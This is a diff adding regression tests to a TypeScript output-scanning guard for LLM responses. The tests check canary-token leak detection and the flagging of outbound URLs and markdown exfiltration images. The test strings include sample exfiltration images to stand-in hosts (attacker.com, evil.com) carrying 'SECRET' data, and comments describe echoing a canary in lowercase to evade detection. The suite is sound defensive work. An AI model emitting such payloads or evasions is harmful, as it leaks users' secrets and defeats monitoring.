@@ -4,6 +4,7 @@ import {
   createGuard,
   scanOutput,
 } from "./index";
+import { scanOutputImpl } from "./output";
 
 // ── generateCanary() ─────────────────────────────────────────────────
 
@@ -133,6 +134,30 @@ describe("Canary token detection", () => {
     const validator = createOutputValidator({ canaryTokens: [] });
     const result = validator.validate("CANARY_fake");
     expect(result.safe).toBe(true);
+  });
+
+  // ── Case-insensitivity / bare-body matching (OUT-6 regression) ─────
+  //
+  // The pre-fix check was `stripped.includes(canary)` — an exact,
+  // case-sensitive substring match. An LLM asked to "repeat the canary"
+  // (or an attacker who knows the check is case-sensitive) could echo it
+  // lowercased and slip past detection while still visibly leaking it.
+
+  test("flags a canary echoed in lowercase (OUT-6)", () => {
+    const c = generateCanary();
+    const validator = createOutputValidator({ canaryTokens: [c] });
+    const result = validator.validate(c.toLowerCase());
+    expect(result.safe).toBe(false);
+    expect(result.flags[0]?.type).toBe("canary_leak");
+  });
+
+  test("flags the random body alone, without the CANARY_ prefix (OUT-6)", () => {
+    const c = generateCanary();
+    const body = c.slice("CANARY_".length);
+    const validator = createOutputValidator({ canaryTokens: [c] });
+    const result = validator.validate(`Here's the code: ${body}`);
+    expect(result.safe).toBe(false);
+    expect(result.flags[0]?.type).toBe("canary_leak");
   });
 
   test("canary at start of output is detected", () => {
@@ -725,6 +750,48 @@ describe("scanOutput", () => {
       );
       expect(mdFindings).toHaveLength(0);
     });
+
+    // ── ReDoS regression (OUT-1) ───────────────────────────────────────
+    //
+    // The pre-fix pattern `!\[.*?\]\(https?:\/\/[^)]+\?[^)]+\)` had two
+    // adjacent `[^)]+` classes that both accept `?`. On unclosed,
+    // `?`-heavy input (no closing `)`) the engine backtracked through
+    // every possible split between them: ~800ms for 200 repetitions of
+    // `![](http://x?`, ~65s on an 8KB payload.
+    test("linear-time on pathological unclosed markdown-image input (ReDoS regression)", () => {
+      const pathological = "![](http://x?".repeat(200);
+      const t0 = Date.now();
+      scanOutput(pathological);
+      expect(Date.now() - t0).toBeLessThan(3000);
+    });
+
+    test("8KB pathological input scans fast and still flags a real exfil image", () => {
+      // Pad with unclosed, query-bearing markdown-image openers (the
+      // catastrophic-backtracking shape) around one genuine exfil image.
+      const padding = "![](http://x?".repeat(320); // ~4160 chars
+      const real = "![leak](https://attacker.com/collect?data=SECRET)";
+      const text = padding + real + padding;
+      expect(text.length).toBeGreaterThan(8000);
+
+      const t0 = Date.now();
+      const result = scanOutput(text);
+      expect(Date.now() - t0).toBeLessThan(200);
+
+      const f = result.findings.find((x) => x.type === "markdown-image-with-query");
+      expect(f).toBeDefined();
+      expect(result.safe).toBe(false);
+    });
+
+    // ── Case-insensitivity / obfuscated separators (OUT-2 regression) ──
+    test("flags an uppercase-scheme markdown image with a query (OUT-2)", () => {
+      const text = "![x](HTTPS://evil.com/p?d=SECRET)";
+      const result = scanOutput(text);
+      const f = result.findings.find(
+        (x) => x.type === "markdown-image-with-query"
+      );
+      expect(f).toBeDefined();
+      expect(result.safe).toBe(false);
+    });
   });
 
   describe("outbound-url", () => {
@@ -779,6 +846,32 @@ describe("scanOutput", () => {
       const result = scanOutput("See https://example.com/help");
       const urls = result.findings.filter((f) => f.type === "outbound-url");
       expect(urls).toHaveLength(1);
+    });
+
+    // ── Case-insensitivity / obfuscated separators (OUT-2 regression) ──
+
+    test("flags an uppercase-scheme URL", () => {
+      const result = scanOutput("Visit HTTPS://evil.com/path");
+      const f = result.findings.find((x) => x.type === "outbound-url");
+      expect(f).toBeDefined();
+    });
+
+    test("flags a protocol-relative URL", () => {
+      const result = scanOutput("Fetch //evil.com/collect?data=1");
+      const f = result.findings.find((x) => x.type === "outbound-url");
+      expect(f).toBeDefined();
+    });
+
+    test("flags a backslash-obfuscated scheme separator", () => {
+      const result = scanOutput("Go to https:\\evil.com");
+      const f = result.findings.find((x) => x.type === "outbound-url");
+      expect(f).toBeDefined();
+    });
+
+    test("does not flag an ordinary code comment as a protocol-relative URL", () => {
+      const result = scanOutput("a // comment explaining the code");
+      const f = result.findings.find((x) => x.type === "outbound-url");
+      expect(f).toBeUndefined();
     });
 
     test("leading-dot allowlist entry matches subdomains but NOT apex", () => {
@@ -864,6 +957,14 @@ describe("scanOutput", () => {
       expect(types.has("outbound-url")).toBe(true);
       expect(types.has("base64-blob")).toBe(true);
       expect(types.has("markdown-image-with-query")).toBe(true);
+    });
+  });
+
+  describe("no scan length cap", () => {
+    test("an exfil image after long padding is still flagged", () => {
+      const padding = "a ".repeat(100_000);
+      const result = scanOutputImpl(`${padding}![x](https://evil.com/p?d=S)`, []);
+      expect(result.findings.some((f) => f.type === "markdown-image-with-query")).toBe(true);
     });
   });
 
